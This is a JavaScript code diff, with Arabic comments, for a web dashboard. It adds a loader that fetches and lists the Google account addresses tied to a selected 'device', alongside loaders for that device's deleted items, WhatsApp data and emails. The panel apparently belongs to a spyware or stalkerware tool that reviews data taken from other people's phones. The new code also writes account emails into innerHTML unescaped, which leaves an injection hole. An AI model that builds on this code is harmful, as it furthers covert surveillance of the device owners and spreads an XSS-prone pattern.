@@ -197,6 +197,7 @@ async function loadAllData() {
     await loadDeleted();
     await loadWhatsApp();
     await loadEmails();
+    await loadGoogleAccounts();
 }
 
 async function loadDeleted() {
@@ -209,6 +210,38 @@ async function loadDeleted() {
             allDeleted = deleted;
             displayDeleted();
         }
+    } catch (e) {}
+}
+
+// ✅ تحميل حسابات Google
+async function loadGoogleAccounts() {
+    try {
+        const response = await fetch(`/api.php?action=get_google_accounts&device=${encodeURIComponent(currentDevice)}`);
+        const accounts = await response.json();
+        
+        const div = document.getElementById('googleAccountsList');
+        if (!div) return;
+        
+        div.innerHTML = '';
+        
+        if (!accounts || accounts.length === 0) {
+            div.innerHTML = '<p style="color:#888;">لا توجد حسابات Google</p>';
+            return;
+        }
+        
+        accounts.forEach(account => {
+            const item = document.createElement('div');
+            item.className = 'conversation-item';
+            item.innerHTML = `
+                <div class="conversation-avatar">📧</div>
+                <div class="conversation-info">
+                    <div class="conversation-name">${account.email || 'غير معروف'}</div>
+                    <div class="conversation-preview">Google Account</div>
+                </div>
+            `;
+            div.appendChild(item);
+        });
+        
     } catch (e) {}
 }
 
@@ -228,7 +261,6 @@ async function loadEmails() {
             return;
         }
         
-        // ✅ تجميع حسب اسم الحساب
         const groups = {};
         emails.forEach(email => {
             const account = email.account_name || email.sender || 'غير معروف';
@@ -265,7 +297,6 @@ async function loadEmails() {
     } catch (e) {}
 }
 
-// ✅ فتح مجموعة حساب — تظهر كل رسائله
 function openEmailGroup(account, groupDiv) {
     const existingBox = groupDiv.nextElementSibling;
     if (existingBox && existingBox.classList.contains('email-box')) {
